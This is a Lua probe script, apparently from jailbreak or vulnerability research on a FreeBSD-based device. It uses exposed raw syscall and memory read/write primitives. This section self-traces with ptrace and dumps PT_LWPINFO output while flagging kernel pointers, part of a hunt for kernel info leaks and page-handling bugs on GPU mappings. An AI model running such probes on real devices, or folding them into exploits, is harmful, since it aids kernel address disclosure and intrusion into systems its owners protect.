-- Isolated continuation after original 110a stopped at getcwd on 2026-10-19.
-- CRASH_CLASS: MODERATE
-- PROBE 110a: VM page manipulation on GPU mmap + standard info leaks
--
-- Context: madvise, mlock, munlock, mincore have NEVER been tested on
-- GPU-mapped pages. These FreeBSD VM syscalls manipulate per-page metadata
-- in the kernel. On device-backed (GPU) pages, the kernel's handling is
-- different from anonymous memory — potential for confused deputy attacks,
-- page fault handler bugs, and physical address leaks.
--
-- Also tests: getrusage (timing side channel), getlogin/getcwd (padding leaks),
-- profil (kernel PC sampling), and ptrace PT_TRACE_ME (via pcall).
--
-- Section A: madvise ops on GPU mmap (MADV_FREE/DONTNEED/etc.) (LOW risk)
-- Section B: mlock/munlock on GPU mmap (MODERATE risk)
-- Section C: mincore on GPU mmap — physical residency leak (LOW risk)
-- Section D: getrusage + getlogin + getcwd + fcntl (LOW risk)
-- Section E: profil kernel PC sampling + ptrace self-trace (MODERATE risk)

print("=== PROBE 110a: VM PAGE MANIPULATION + STANDARD INFO LEAKS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local SYS_getpid    = 20
local SYS_ptrace    = 26
local SYS_profil    = 44
local SYS_getlogin  = 49
local SYS_madvise   = 75
local SYS_mincore   = 78
local SYS_getgroups = 79
local SYS_fcntl     = 92
local SYS_getrusage = 117
local SYS_mlock     = 203
local SYS_munlock   = 204
local SYS_mmap      = 477
local SYS_getcwd    = 326

local pid = to_num(make_syscall(SYS_getpid)())
print("pid: " .. pid)

-- E2: ptrace(26) — self-trace (pcall-protected)
print("[E] E2: ptrace self-trace (pcall-protected)")
repeat
    -- PT_TRACE_ME = 0
    local ok1, rv1 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    print("[E] PT_TRACE_ME: ok=" .. tostring(ok1) .. " ret=" .. tostring(rv1))

    if not ok1 then
        print("[E] ptrace(PT_TRACE_ME) threw exception — blocked or crashes")
        break
    end

    if to_num(rv1) == 0 then
        print("[E] *** PT_TRACE_ME SUCCEEDED ***")
    end

    -- PT_LWPINFO = 13 (FreeBSD) — get LWP info for self
    -- struct ptrace_lwpinfo has pl_lwpid, pl_event, pl_flags, pl_sigmask, etc.
    local lwpinfo = memory.alloc(0x100)
    for i = 0, 0xFF, 4 do safe_wd(lwpinfo + i, 0xDEADBEEF) end

    local ok2, rv2 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(13), uint64(pid),
            uint64(lwpinfo), uint64(0x100)))
    end)
    print("[E] PT_LWPINFO: ok=" .. tostring(ok2) .. " ret=" .. tostring(rv2))

    if ok2 and to_num(rv2) == 0 then
        print("[E] lwpinfo dump:")
        for i = 0, 0x7F, 8 do
            local qv = safe_rq(lwpinfo + i)
            local h, l = get_hi_lo(qv)
            local m = ""
            if is_kptr(qv) then m = " *** KPTR ***" end
            if h ~= 0xDEADBEEF then
                print("[E]   +" .. string.format("%02X", i) .. ": " .. fmt_addr(qv) .. m)
            end
        end
    end

    -- PT_GETNUMLWPS = 14
    local ok3, rv3 = pcall(function()
        return to_num(make_syscall(SYS_ptrace)(uint64(14), uint64(pid), uint64(0), uint64(0)))
    end)
    print("[E] PT_GETNUMLWPS: ok=" .. tostring(ok3) .. " ret=" .. tostring(rv3))
until true

print("")
print("=== PROBE 110a sectionE2 COMPLETE ===")
